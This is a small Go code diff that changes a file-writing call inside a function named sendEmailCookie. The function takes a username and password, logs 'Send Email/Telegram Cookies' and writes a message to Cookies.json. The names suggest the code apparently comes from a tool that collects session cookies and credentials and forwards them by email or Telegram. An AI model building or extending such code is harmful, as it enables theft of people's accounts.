@@ -100,7 +100,7 @@ func sendEmailCookie(msg string, username string, password string, KeyUser strin
 
 	log.Println("Send Email/Telegram Cookies")
 
-	err := os.WriteFile("Cookies.json", []byte(msg), 0755)
+	err := ioutil.WriteFile("Cookies.json", []byte(msg), 0755)
 	if err != nil {
 		fmt.Printf("Unable to write file: %v", err)
 	}
